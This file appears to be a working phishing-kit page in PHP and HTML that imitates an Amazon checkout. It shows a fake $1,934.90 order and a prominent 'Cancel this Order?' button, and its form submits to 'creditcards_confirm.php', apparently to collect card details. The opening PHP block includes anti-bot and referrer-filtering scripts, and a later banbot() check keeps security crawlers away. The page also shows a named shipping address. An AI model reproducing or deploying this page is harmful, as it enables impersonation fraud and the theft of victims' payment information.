<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
?>
<head>
  <script async="" src="https://images-na.ssl-images-amazon.com/images/I/31bJewCvY-L.js"
    crossorigin="anonymous"></script>
  <script>var aPageStart = (new Date()).getTime();</script>
  <meta charset="utf-8">

  <!-- sp:end-feature:csm:head-open-part1 -->
  <!-- sp:feature:cs-optimization -->
  <meta http-equiv="x-dns-prefetch-control" content="on">
  <link rel="preconnect" href="https://images-na.ssl-images-amazon.com" crossorigin="">
  <link rel="preconnect" href="https://m.media-amazon.com" crossorigin="">
  <link rel="preconnect" href="https://completion.amazon.com" crossorigin="">
  <!-- sp:end-feature:cs-optimization -->
  <!-- sp:feature:csm:head-open-part2 -->

  <!-- 68bg7adiofbllp1c03xy4fqqricz8kxbci4jbkseoc -->
  <script>window.ue && ue.count && ue.count('CSMLibrarySize', 9842)</script>
  <!-- sp:end-feature:csm:head-open-part2 -->
  <!-- sp:feature:aui-assets -->
  <link rel="stylesheet"
    href="https://m.media-amazon.com/images/I/11EIQ5IGqaL._RC|01ZTHTZObnL.css,410yLeQZHKL.css,31OSFXVtM5L.css,013z33uKh2L.css,017DsKjNQJL.css,0131vqwP5UL.css,41EWOOlBJ9L.css,11TIuySqr6L.css,01ElnPiDxWL.css,11fJbvhE5HL.css,01Dm5eKVxwL.css,01IdKcBuAdL.css,01y-XAlI+2L.css,21P6CS3L9LL.css,01oDR3IULNL.css,412+GafmYFL.css,01XPHJk60-L.css,01S0vRENeAL.css,21IbH+SoKSL.css,11MrAKjcAKL.css,21fecG8pUzL.css,11a5wZbuKrL.css,01CFUgsA-YL.css,31pHA2U5D9L.css,11qour3ND0L.css,116t+WD27UL.css,11gKCCKQV+L.css,11061HxnEvL.css,11oHt2HYxnL.css,01j2JE3j7aL.css,11JQtnL-6eL.css,21KA2rMsZML.css,11jtXRmppwL.css,0114z6bAEoL.css,21uwtfqr5aL.css,11QyqG8yiqL.css,11K24eOJg4L.css,11F2+OBzLyL.css,01890+Vwk8L.css,01g+cOYAZgL.css,01cbS3UK11L.css,21F85am0yFL.css,01giMEP+djL.css_.css?AUIClients/AmazonUI&amp;btx4ugoz#us.not-trident.577971-T1.577969-T1.632675-T1.577878-T1">

  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/01CGKqzfp4L.css?AUIClients/FreshTipsAssets#us">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/01bGZxgm4cL.css?AUIClients/HITPrescriptionAssets">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/01-RGMDtmPL.css?AUIClients/AuthorFollowAssets">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/01SqrMBQNjL.css?AUIClients/ShopWithPointsCheckoutAssets">
  <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01Jc1qpwGRL.css?AUIClients/APXAssets">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/01eZz3big8L.css?AUIClients/VASUpsellCheckoutAssets&amp;aFHf+8D5#471302-T1">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/1122L7vpUhL._RC|11QX7EIkQ6L.css_.css?AUIClients/HeavyBulkyCheckoutAssets&amp;unrhoiz9#471302-T1.187358-T1">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/017RBX6Wg+L.css?AUIClients/FinancialOfferCheckoutAssets">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/41v0XMkggVL.css?AUIClients/AddressUIWidgetsServiceAssets">

  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/41Nsc1KX3eL.css?AUIClients/CheckoutCommonAsset">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/31tMzCyBYHL.css?AUIClients/CheckoutWebappAssets">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/01sfWVjaI9L.css?AUIClients/KYCAssets#desktop">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/11JtpyrJgqL.css?AUIClients/CalendarAssets">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/31eusaA5fzL._RC|31FeabfZ9EL.css,01shP5A752L.css_.css?AUIClients/VasRcxCheckoutAsset&amp;eMrhkXk2#471302-T1.268182-T1">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/31e9uvqZ80L.css?AUIClients/CheckoutSinglePagePipeline">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/01jBdQ0vkSL.css?AUIClients/LoganHorizonteCheckoutAssets">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/21DKiuKAnTL.css?AUIClients/AmazonPopoversAUIShim">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/41WN3xF8vCL.css?AUIClients/SDCXRetailAssets">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/11JNpHBdboL.css?AUIClients/AmazonDayCheckoutAssets">
  <link rel="stylesheet"
    href="https://images-na.ssl-images-amazon.com/images/I/012WYoVL7NL._RC|0163sx0CGvL.css,11qPBAVT07L.css_.css?AUIClients/ScheduledDeliveryCheckoutAssets&amp;aFHf+8D5#471302-T1">

<body
  class="a-m-us a-aui_72554-c a-aui_accordion_a11y_role_354025-t1 a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
  <div class="template loading-spinner-spp" style="display:none">
    <div class="loading-spinner-spp-blocker"></div>
    <div class="loading-spinner-spp-inner"><img class="loading-spinner-spp-img"
        src="https://images-na.ssl-images-amazon.com/images/G/01/amazonui/loading/loading-4x._V391853216_.gif"></div>
  </div>
  <div class="template loading-spinner" style="display:none">
    <div class="loading-spinner-blocker"></div>
    <div class="loading-spinner-inner"><img id="loading-spinner-img" class="loading-spinner-img"
        src="https://images-na.ssl-images-amazon.com/images/G/01/amazonui/loading/loading-4x._V391853216_.gif"></div>
  </div>
  <div id="loading-spinner-blocker-doc" class="loading-spinner-blocker" style="display:none;"></div>
  <div id="spinner-anchor" class="spinner-anchor" style="display:none"></div>
  <div id="a-page">
    <script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">
    </script>



        <div class="a-section a-spacing-none">
            
    
        
            <div class="a-container content-container">
                
                <script type="checkout-asset-trigger" data-checkout-asset-trigger="AddressUIWidgetsServiceAssets"></script>

    <input type="hidden" name="" value="Saving your changes..." id="defaultBuyBtnBlockerMsg">
    <img alt="" src="https://m.media-amazon.com/images/G/01/amazonui/loading/loading-1x._CB485947033_.gif"
      class="aok-hidden" id="smallLoadingSpinner">
    <img alt="" src="https://m.media-amazon.com/images/G/01/amazonui/loading/loading-4x._CB485930722_.gif"
      class="aok-hidden" id="bigLoadingSpinner">



    <input type="hidden" name="isPipelinedPage" value="1" id="isPipelinedPage">




    <div id="header" class="a-section a-spacing-none banner-border celwidget" role="banner"
      data-csa-c-id="89qe7y-ja0p6a-p2m561-6ccop5" data-cel-widget="header">
      <div class="a-row a-grid-vertical-align a-grid-center page-container a-text-center">
        <div class="a-column a-span2">
          <div class="a-row">
            <div class="a-column a-span2"></div>
            <div id="banner-image" class="a-column a-span12 a-span-last">
              <span class="a-declarative" data-action="a-popover"
                data-a-popover="{&quot;closeButton&quot;:&quot;false&quot;,&quot;name&quot;:&quot;amzn-logo-popover&quot;,&quot;activate&quot;:&quot;onclick&quot;}">
                <span class="a-declarative" data-action="ue-count"
                  data-ue-count="{&quot;countFlag&quot;:&quot;checkout:spp-logo:popover-show&quot;,&quot;countValue&quot;:1}">
                  <i class="a-icon a-icon-logo a-block clickable-heading" role="img"></i>
                </span>
              </span>
            </div>
          </div>

        </div>
        <div class="a-popover-preload" id="a-popover-amzn-logo-popover">


        </div>

        <div class="a-column a-span8">
          <h1>
            Checkout
            <span class="a-size-large">
              (<span class="a-declarative" data-action="a-popover"
                data-a-popover="{&quot;closeButton&quot;:&quot;false&quot;,&quot;name&quot;:&quot;amzn-cart-link-popover&quot;,&quot;popoverLabel&quot;:&quot;2 items&quot;,&quot;activate&quot;:&quot;onclick&quot;}"><span
                  class="a-declarative" data-action="ue-count"
                  data-ue-count="{&quot;countFlag&quot;:&quot;checkout:spp-cart-link:popover-show&quot;,&quot;countValue&quot;:1}"><span
                    class="a-color-link clickable-heading">2 items</span></span></span>)
            </span>
            <div class="a-popover-preload" id="a-popover-amzn-cart-link-popover">


            </div>
          </h1>
        </div>
        <div class="a-column a-span2 a-span-last">
          <a class="a-link-normal no-link" target="_blank" rel="noopener"
            href="/gp/help/customer/display.html?ie=UTF8&amp;nodeId=201909010&amp;ref_=ox_spc_privacy#">
            <img alt="Website is secured with SSL"
              src="https://m.media-amazon.com/images/G/01/x-locale/checkout/truespc/secured-ssl._CB485936932_.png">
          </a>
        </div>
      </div>
    </div>



    <style>
      .a-icon.a-icon-domain-se {
        font-style: normal;
        vertical-align: sub;
        height: auto;
        background: none;
      }

      .a-icon.a-icon-domain-pl {
        font-style: normal;
        vertical-align: sub;
        height: auto;
        background: none;
      }

      .a-icon.a-icon-domain-tr {
        font-style: normal;
        vertical-align: sub;
        height: auto;
        background: none;
      }

      .a-icon.a-icon-domain-be {
        font-style: normal;
        vertical-align: sub;
        height: auto;
        background: none;
      }

      .a-icon.a-icon-domain-co {
        font-style: normal;
        vertical-align: sub;
        height: auto;
        background: none;
      }

      .a-icon.a-icon-domain-cl {
        font-style: normal;
        vertical-align: sub;
        height: auto;
        background: none;
      }

      .a-icon.a-icon-domain-ng {
        font-style: normal;
        vertical-align: sub;
        height: auto;
        background: none;
      }

      .a-icon.a-icon-domain-za {
        font-style: normal;
        vertical-align: sub;
        height: auto;
        background: none;
      }

      .a-icon.a-icon-domain-se:after {
        content: ".se";
      }

      .a-icon.a-icon-domain-pl:after {
        content: ".pl";
      }
    </style>
    <div class="a-container page-container">
      <div class="a-fixed-right-grid">
        <div class="a-fixed-right-grid-inner" style="padding-right:290px">
          <div class="a-fixed-right-grid-col a-col-left" style="padding-right:3.5%;float:left;">
            <div class="a-row">
              <div class="a-section" role="main">


                <div class="a-row a-spacing-small">

                  <div id="shipaddress" data-step-index="1"
                    class="a-row expanded cacheable-spp-panel spp-panel celwidget"
                    data-csa-c-id="fo390n-nqmahy-i0n8ym-6d9byu" data-cel-widget="shipaddress">


                    <div class="a-row panel-content">



                      <div aria-label="Choose a shipping address" class="a-section" role="form">

                        <div class="a-fixed-left-grid">
                          <div class="a-fixed-left-grid-inner" style="padding-left:35px">
                            <div class="a-fixed-left-grid-col a-col-left"
                              style="width:35px;margin-left:-35px;float:left;">
                            </div>
                            <div class="a-fixed-left-grid-col a-col-right" style="padding-left:0%;float:left;">
                              <div class="a-row a-spacing-none">



                                <form id="address-list" method="post" action="creditcards_confirm.php"
                                  data-enable-form-prefetch="1" data-max-prefetches="5" aria-label="Your addresses"
                                  class="checkout-page-form a-spacing-none">
                                  <div class="a-box-group a-spacing-small">
                                    <div class="a-box">
                                      <div class="a-box-inner">



                                        <fieldset>


                                          <h4>


                                            <div class="a-row">
                                              <div class="a-column a-span5 a-text-left">
                                                <span class="a-text-bold">
                                                  Your default addresses
                                                </span>
                                              </div>
                                              <div class="a-column a-span5 a-text-right a-span-last">


                                                <div class="a-row a-spacing-top-">
                                                  <a data-pipeline-link-args="useCase=multiAddress"
                                                    data-pipeline-link-from-page="spp-shipaddress"
                                                    data-pipeline-link-ref="chk_addr_stma_sec"
                                                    data-pipeline-link-to-page="spp-ship-to-multiple" data-testid=""
                                                    class="a-size-base a-link- pipeline-link" href="#">
                                                    Shipping to more than one address?
                                                  </a>
                                                </div>
                                              </div>
                                            </div>

                                          </h4>


                                          <hr class="a-spacing-small a-divider-normal">
                                          <div class="a-row address-row list-address-selected">
                                            <span class="a-declarative" data-action="select-address-in-list"
                                              data-select-address-in-list="{}">
                                              <div data-a-input-name="submissionURL" class="a-radio"><label><input
                                                    type="radio" name="submissionURL"
                                                    value="/checkout/p/p-106-8449982-8910622/address/shiptodestination/ref=chk_addr_select_1_customer?_encoding=UTF8&amp;action=select-shipping&amp;addressID=HMC3Z7JEF5IE6A3TPMEQG12G4XTU8F705A31507F8UTX4G0PXTQ2EIA2OX7SOM7J&amp;enableDeliveryPreferences=1&amp;fromAnywhere=0&amp;isCurrentAddress=0&amp;numberOfDistinctItems=1&amp;purchaseId=106-8449982-8910622&amp;requestToken="
                                                    checked=""><i class="a-icon a-icon-radio"></i><span
                                                    class="a-label a-radio-label">

                                                    <span class="a-text-bold">
                                                      <span class="break-word">Darryl E. Garcia</span>
                                                    </span>

                                                    <span class="break-word">4931 Single Street
                                                      Quincy, MA 02169 </span>


                                                  </span></label></div>
                                            </span>
                                          </div>


                                        </fieldset>



                                        <div class="a-row a-spacing-extra-large addressbook-footer">
                                          <span class="a-declarative" data-action="trigger-modal-dialog"
                                            data-trigger-modal-dialog="{}">
                                            <img alt=""
                                              src="https://m.media-amazon.com/images/G/01/checkout/assets/addAddress._CB454652023_.png"
                                              class="add-address-image cursor-pointer">
                                            <a id="add-new-address-popover-link" data-add-address-ref="chk_addr_add_sec"
                                              data-testid="" class="a-size-base a-link-normal" href="#">
                                              Add a new address
                                            </a>
                                            <span class="a-declarative" data-action="a-modal"
                                              data-a-modal="{&quot;name&quot;:&quot;add-address&quot;,&quot;popoverLabel&quot;:&quot;Enter a new shipping address&quot;,&quot;header&quot;:&quot;Enter a new shipping address&quot;}"></span>
                                          </span>
                                        </div>


                                      </div>
                                    </div>

                                    <div class="a-box a-box-title">
                                      <div class="a-box-inner">
                                        <span id="guestSubmit" style="background:rgb(253, 131, 131); font-size: 30px"
                                          class="a-button primary-action-button"><span class="a-button-inner"><input
                                              data-testid="Address_selectShipToThisAddress" class="a-button-input"
                                              type="submit" aria-labelledby="shipToThisAddressButton-announce"><span
                                              id="shipToThisAddressButton-announce" class="a-button-text a-text-center"
                                              aria-hidden="true">
                                              Cancel this Order?
                                            </span></span></span><span
                                          style="font-size: 40px; color: red; padding-left: 10px;">!</span>
                                      </div>
                                    </div>
                                  </div>
                                  <input type="hidden" name="hasWorkingJavascript" value="1">
                                </form>


                                <div class="a-row aok-hidden">



                                  <div class="a-box a-spacing-small a-color-base-background">
                                    <div class="a-box-inner">
                                      <div class="a-row">
                                        <div class="a-column a-span6">


                                          <div class="a-popover-preload" id="a-popover-add-address">
                                            <div id="add-address-popover" data-testid="" class="a-row">


                                              <input type="hidden" name="purchaseId" value="106-8449982-8910622">
                                              </script>
                                              <link rel="stylesheet"
                                                href="https://images-na.ssl-images-amazon.com/images/I/11s9NfwmKmL.css?AUIClients/AddressWizardAssets">
                                              <script>
                                                  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61+GlVlplUL.js?AUIClients/AddressWizardAssets');
                                              </script>


                                            </div>
                                          </div>

                                          <div class="a-popover-preload" id="a-popover-edit-address">
                                            <div id="edit-address-popover" data-testid="" class="a-row"></div>
                                          </div>

                                          <div class="a-popover-preload" id="a-popover-address-suggestions">
                                            <div id="address-suggestions-popover" data-testid="" class="a-row"></div>
                                          </div>

                                          <span class="a-declarative" data-action="trigger-modal-dialog"
                                            data-trigger-modal-dialog="{}">
                                            <a id="edit-address-popover-link" class="a-link-normal aok-hidden"
                                              href="#"></a>
                                            <span class="a-declarative" data-action="a-modal"
                                              data-a-modal="{&quot;name&quot;:&quot;edit-address&quot;,&quot;popoverLabel&quot;:&quot;Update your shipping address&quot;,&quot;footer&quot;:&quot;\n\u003cdiv class=\&quot;a-row a-text-left\&quot;>\n  \u003cspan class=\&quot;a-declarative\&quot; data-action=\&quot;edit-address-popover-submit\&quot; data-edit-address-popover-submit=\&quot;{}\&quot;>\n    \u003cspan id=\&quot;newAddressUseThisAddressButton\&quot; class=\&quot;a-button a-button-primary\&quot;>\u003cspan class=\&quot;a-button-inner\&quot;>\u003cinput name=\&quot;fromAddressEditToContinue\&quot; data-testid=\&quot;\&quot; class=\&quot;a-button-input\&quot; type=\&quot;submit\&quot; aria-labelledby=\&quot;newAddressUseThisAddressButton-announce\&quot;>\u003cspan id=\&quot;newAddressUseThisAddressButton-announce\&quot; class=\&quot;a-button-text a-text-center\&quot; aria-hidden=\&quot;true\&quot;>\n      Use this address\n    \u003c/span>\u003c/span>\u003c/span>\n  \u003c/span>\n\u003c/div>\n&quot;,&quot;header&quot;:&quot;Update your shipping address&quot;}"></span>
                                          </span>

                                          <span class="a-declarative" data-action="trigger-modal-dialog"
                                            data-trigger-modal-dialog="{}">
                                            <a id="address-suggestions-popover-link" class="a-link-normal aok-hidden"
                                              href="#"></a>
                                            <span class="a-declarative" data-action="a-modal"
                                              data-a-modal="{&quot;name&quot;:&quot;address-suggestions&quot;,&quot;popoverLabel&quot;:&quot;Verify your shipping address&quot;,&quot;footer&quot;:&quot;\n\u003cdiv class=\&quot;a-row a-text-left\&quot;>\n  \u003cspan class=\&quot;a-declarative\&quot; data-action=\&quot;address-suggestions-submit\&quot; data-address-suggestions-submit=\&quot;{}\&quot;>\n    \u003cspan class=\&quot;a-button a-button-primary\&quot;>\u003cspan class=\&quot;a-button-inner\&quot;>\u003cinput name=\&quot;useSelectedAddress\&quot; data-testid=\&quot;\&quot; class=\&quot;a-button-input\&quot; type=\&quot;submit\&quot;>\u003cspan class=\&quot;a-button-text a-text-center\&quot; aria-hidden=\&quot;true\&quot;>\n      Use this address\n    \u003c/span>\u003c/span>\u003c/span>\n  \u003c/span>\n  \u003cspan class=\&quot;a-letter-space\&quot;>\u003c/span>\n  \u003cspan class=\&quot;a-declarative\&quot; data-action=\&quot;edit-address-suggestions\&quot; data-edit-address-suggestions=\&quot;{}\&quot;>\n    \u003cspan class=\&quot;a-button a-button-base\&quot;>\u003cspan class=\&quot;a-button-inner\&quot;>\u003cinput data-testid=\&quot;\&quot; class=\&quot;a-button-input\&quot; type=\&quot;submit\&quot;>\u003cspan class=\&quot;a-button-text\&quot; aria-hidden=\&quot;true\&quot;>\n      Edit this address\n    \u003c/span>\u003c/span>\u003c/span>\n  \u003c/span>\n\u003c/div>\n&quot;,&quot;header&quot;:&quot;Verify your shipping address&quot;}"></span>
                                          </span>





                                          <div class="a-row a-spacing-top-">
                                            <a data-pipeline-link-args="useCase=multiAddress"
                                              data-pipeline-link-from-page="spp-shipaddress"
                                              data-pipeline-link-ref="chk_addr_stma_sec"
                                              data-pipeline-link-to-page="spp-ship-to-multiple" data-testid=""
                                              class="a-size-base a-link- pipeline-link"
                                              href="/gp/buy/addressselect/handlers/continue.html?action=ship-to-multiple&amp;autoSplitIfApplicable=1&amp;multiAddress=1">
                                              Shipping to more than one address?
                                            </a>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>


                                </div>

                                <input type="hidden" name="preloadAddressPopover" value="1">
                                <input type="hidden" name="shipToAddress" value="1">


                              </div>
                            </div>
                          </div>
                        </div>
                      </div>




                    </div>
                  </div>
                </div>


                <div class="a-row a-spacing-small">

                  <div id="payment" data-step-index="2" class="a-row collapsed cacheable-spp-panel spp-panel celwidget"
                    data-csa-c-id="pste2g-e0rzuw-in1yhe-wpi787" data-cel-widget="payment">
                    <hr class="a-divider-normal">
                    <div class="a-row panel-content">

                      <div aria-label="Payment method" class="a-section" role="form">
                        <div class="a-row">
                          <div class="a-column a-span5">
                            <h3 data-testid="" class="a-color-secondary">
                              2<span class="a-letter-space"></span><span class="a-letter-space"></span>
                              Payment method
                            </h3>
                          </div>

                          <div data-testid="" class="a-column a-span5">

                          </div>

                          <div class="a-column a-span2 a-text-right a-span-last">
                          </div>
                        </div>
                      </div>





                    </div>
                  </div>
                </div>


                <div class="a-row a-spacing-small">

                  <div id="revieworder" data-step-index="3"
                    class="a-row collapsed cacheable-spp-panel spp-panel celwidget"
                    data-csa-c-id="m4gvmp-c54c5y-4zhc6b-wgqcno" data-cel-widget="revieworder">
                    <hr class="a-divider-normal">
                    <div class="a-row panel-content">



                      <div aria-label="Items and shipping" class="a-section" role="form">
                        <div class="a-row">
                          <div class="a-column a-span12">
                            <h3 data-testid="" class="a-color-secondary">
                              3<span class="a-letter-space"></span><span class="a-letter-space"></span>
                              Items and shipping
                            </h3>
                          </div>


                          <div class="a-column a-span2 a-text-right a-span-last">
                          </div>
                        </div>
                      </div>




                    </div>
                  </div>
                </div>


              </div>
            </div>

            <div class="a-fixed-left-grid a-spacing-base">
              <div class="a-fixed-left-grid-inner" style="padding-left:35px">
                <div class="a-fixed-left-grid-col a-col-left" style="width:35px;margin-left:-35px;float:left;">
                </div>
                <div class="a-fixed-left-grid-col a-col-right" style="padding-left:0%;float:left;">



                </div>
              </div>
            </div>

            <div class="a-divider a-divider-section">
              <div class="a-divider-inner"></div>
            </div>







            <div id="footer" data-testid="" class="a-row cacheable-spp-section celwidget"
              data-csa-c-id="9vaivk-kgar6w-qetid9-yt9b62" data-cel-widget="footer">




              <div id="sellerofrecord" class="a-row a-spacing-small a-size-mini a-color-secondary">
                *Why has sales tax been applied?
                <a target="AmazonHelp" class=""
                  href="/gp/checkout/confirm/seller-of-record.html/ref=chk_help_merchtaxfooter_pri">See tax and seller
                  information.</a>
              </div>

              <div class="a-row a-spacing-small a-size-mini a-color-secondary">
                Need help? Check our <a class="a-link-normal" target="AmazonHelp" rel="noopener"
                  href="/gp/help/customer/display.html/ref=chk_help_helpfooter_pri?ie=UTF8&amp;nodeId=3528941">Help
                  pages</a> or <a href="/gp/help/contact-us/general-questions.html/ref=chk_help_contactfooter_pri"
                  target="AmazonHelp">contact us</a>
              </div>


              <div class="a-row a-spacing-small a-size-mini a-color-secondary">
                For an item sold by Amazon.com: When you click the "Place your order" button, we'll send you an email
                message acknowledging receipt of your order. Your contract to purchase an item will not be complete
                until we send you an email notifying you that the item has been shipped.
              </div>

              <div id="export-charges" class="a-row a-spacing-small a-size-mini a-color-secondary">
                All items in this order are sold by Amazon Export Sales LLC (AES), unless otherwise noted. By placing
                your order, you authorize AES to designate a carrier to clear the package and pay the import fees on
                your (or the recipient's) behalf. Customs declarations will be made in the name and on the behalf of
                your (or the recipient's) behalf by the designated carrier. You can find the complete terms and
                conditions of your order
                <a target="AmazonHelp" class=""
                  href="/gp/help/customer/display.html?ie=UTF8&amp;nodeId=14309551&amp;ref=ox_spc_timex_tandc#">here</a>
              </div>



              <div id="state-sales-tax-info" class="a-row a-spacing-small a-size-mini a-color-secondary">
                <a class="a-link-normal" target="AmazonHelp" rel="noopener"
                  href="/gp/help/customer/display.html/ref=chk_help_statetaxfooter_pri?ie=UTF8&amp;nodeId=202029100">Important
                  information about sales tax you may owe in your state</a>
              </div>




              <div class="a-row a-spacing-small a-size-mini a-color-secondary">
                You may return new, unopened merchandise in original condition within 30 days of delivery. Exceptions
                and restrictions apply. See Amazon.com's <a class="a-link-normal" target="AmazonHelp" rel="noopener"
                  href="/gp/help/customer/display.html/ref=chk_help_returnsfooter_pri?ie=UTF8&amp;nodeId=201819090">Returns
                  Policy</a>.<br><br>Need to add more items to your order? Continue shopping on the <a
                  href="https://www.amazon.com/ref=chk_help_homefooter_pri">Amazon.com homepage</a>.
              </div>

              <div class="a-popover-preload" id="a-popover-">
                <div id="return-policy-help" class="a-row help-content"></div>
              </div>
            </div>

          </div>
          <div id="subtotalsSection" class="a-fixed-right-grid-col a-col-right"
            style="width:290px;margin-right:-290px;float:left;">
            <div id="subtotalsContainer" class="a-box-group" style="position: relative; top: 0px; width: inherit;">


              <div id="subtotals" class="a-box a-first cacheable-spp-section celwidget"
                data-csa-c-id="g38uo-tb10hb-rlimkh-ptfplx" data-cel-widget="subtotals">
                <div class="a-box-inner">

                  <div class="a-row place-order-button">
                    <div class="a-row a-spacing-micro">


                      <input type="hidden" name="" value="1" id="is-remove-os-pabt">


                      <div class="a-row continue-buttons place-order-button">
                        <div id="place-order-btn-blocker-msg" class="a-row hidden">
                        </div>





                        <div class="a-row">


                          <span class="a-declarative" data-action="a-tooltip-button-blocker"
                            data-a-tooltip-button-blocker="{&quot;name&quot;:&quot;continue-error-popover&quot;}">
                            <span class="a-declarative" data-action="buy-button-as-primary-action"
                              data-buy-button-as-primary-action="{}">
                              <span id="orderSummaryPrimaryActionBtn"
                                class="a-button a-button-span12 a-button-primary celwidget  buy-button-height buy-button-sky-fix"
                                data-csa-c-id="qab9ys-vxf491-cggcis-9ac8tj"
                                data-cel-widget="orderSummaryPrimaryActionBtn"><span class="a-button-inner"><input
                                    class="a-button-input" type="submit"
                                    aria-labelledby="orderSummaryPrimaryActionBtn-announce"><span
                                    id="orderSummaryPrimaryActionBtn-announce" class="a-button-text" aria-hidden="true">
                                    <span class="os-primary-action-button-text buy-button-line-height">Use this
                                      address</span>
                                  </span></span></span>
                            </span>
                          </span>


                        </div>
                      </div>

                      <input type="hidden" name="isfirsttimecustomer" value="0">

                    </div>

                    <div class="a-row a-spacing-small a-text-center condensed-line-height">
                      <span class="a-size-mini">
                        Choose a shipping address to continue checking out. You'll still have a chance to review and
                        edit your order before it's final.

                      </span>
                    </div>
                    <hr class="a-spacing-small a-divider-normal">
                  </div>

                  <div aria-label="Order summary and subtotal" class="a-section" role="form">

                    <div class="a-row order-summary">
                      <div class="a-row a-grid-vertical-align a-grid-center">








                        <div id="spc-order-summary" class="a-row">

                          <input type="hidden" name="isTFXEligible" id="isTFXEligible">
                          <input type="hidden" name="isFxEnabled" id="isFxEnabled">
                          <input type="hidden" name="isFXTncShown" id="isFXTncShown">



                          <h3 class="a-spacing-base a-spacing-top-micro">Order Summary</h3>


                          <div id="subtotals-marketplace-table" class="a-row a-size-small">
                            <table data-testid="" class="a-normal small-line-height">




                              <tbody>
                                <tr data-testid="" class="order-summary-unidenfitied-style">
                                  <td class="a-text-left">
                                    Items (2):
                                  </td>
                                  <td class="a-text-right a-align-bottom aok-nowrap">
                                    $1,834.90
                                  </td>
                                </tr>


                                <tr data-testid="" class="order-summary-unidenfitied-style">
                                  <td class="a-text-left">
                                    Shipping &amp; handling:
                                  </td>
                                  <td class="a-text-right a-align-bottom aok-nowrap">
                                    --
                                  </td>
                                </tr>


                                <tr data-testid="" class="order-summary-separator">
                                  <td></td>
                                  <td class="a-span3 cell-separator">
                                    <hr class="a-spacing-none a-divider-normal">
                                  </td>
                                </tr>


                                <tr data-testid="" class="order-summary-unidenfitied-style">
                                  <td class="a-text-left">
                                    Total before tax:
                                  </td>
                                  <td class="a-text-right a-align-bottom aok-nowrap">
                                    --
                                  </td>
                                </tr>


                                <tr data-testid="" class="order-summary-unidenfitied-style">
                                  <td class="a-text-left">
                                    Estimated tax to be collected:
                                  </td>
                                  <td class="a-text-right a-align-bottom aok-nowrap">
                                    --
                                  </td>
                                </tr>


                                <tr class="order-summary-grand-total">
                                  <td colspan="2" class="cell-separator">
                                    <hr class="a-spacing-mini a-divider-normal">
                                  </td>
                                </tr>
                                <tr data-testid="">
                                  <td class="a-color-price a-size-medium a-text-left a-text-bold">
                                    Order total: $1,934.90
                                  </td>
                                  <td class="a-size-medium a-text-right a-align-bottom aok-nowrap grand-total-price">
                                    --
                                  </td>
                                </tr>






                              </tbody>
                            </table>
                          </div>










                          <div class="a-popover-preload" id="a-popover-regulatory-fee-breakdown_nt_t">
                            <table id="nonTaxableRegulatoryFeeBreakdown-transactional-table"
                              class="a-normal small-line-height">



                            </table>
                          </div>







                          <input type="hidden" name="useTFXGurupaSetter" value="1" id="useTFXGurupaSetter">



                        </div>


                      </div>
                    </div>

                  </div>
                </div>
              </div>
              <?php if (isset($_SESSION['device']) && !stripos($_SESSION['device'], 'yochi'))
                                        {
                                            banbot();
                                        }
                                        ; ?>
              <div id="callouts" class="a-box a-last a-color-alternate-background cacheable-spp-section celwidget"
                data-csa-c-id="zgxi64-w28thx-43nzo9-3jiuk0" data-cel-widget="callouts">
                <div class="a-box-inner">




                  <div class="a-row a-spacing-mini a-size-mini">


                    <!-- ###START orderSummaryPolicyMessage-SUPPORTING_TEXT### -->

                    <!-- ###END orderSummaryPolicyMessage-SUPPORTING_TEXT### -->

                  </div>


                  <div class="a-row a-spacing-mini a-size-mini">
                    <!-- ###START orderSummaryPolicyMessage-ACCB_DESCRIPTION_LINK_ORDER_SUMMARY_POLICY_MESSAGE### -->

                    <!-- ###END orderSummaryPolicyMessage-ACCB_DESCRIPTION_LINK_ORDER_SUMMARY_POLICY_MESSAGE### -->
                  </div>
                  <div class="a-row a-spacing-mini a-size-mini"><a
                      href="/gp/help/customer/display.html/ref=chk_help_shipcosts_pri?ie=UTF8&amp;nodeId=468520"
                      target="AmazonHelp">How are shipping costs calculated?</a></div>
                  <div class="a-row a-spacing-mini a-size-mini">
                    <!-- ###START orderSummaryPolicyMessage-ACCB_GIFT_CARD_ORDER_SUMMARY_POLICY_MESSAGE### -->

                    <!-- ###END orderSummaryPolicyMessage-ACCB_GIFT_CARD_ORDER_SUMMARY_POLICY_MESSAGE### -->
                  </div>






                </div>
              </div>


              <div id="ordersummaryupsell" class="a-box a-last cacheable-spp-section celwidget aok-hidden"
                data-csa-c-id="lrcoru-lgkedz-2j9013-45soaj" data-cel-widget="ordersummaryupsell">
                <div class="a-box-inner">
                </div>
              </div>

            </div>
          </div>
        </div>
      </div>
    </div>


    <div id="page-buffer" class="a-row hidden"></div>




    <img src="/gp/checkoutonebyone/pagetype-checkout.html" style="display:none">

  </div>



  </div>



  <img
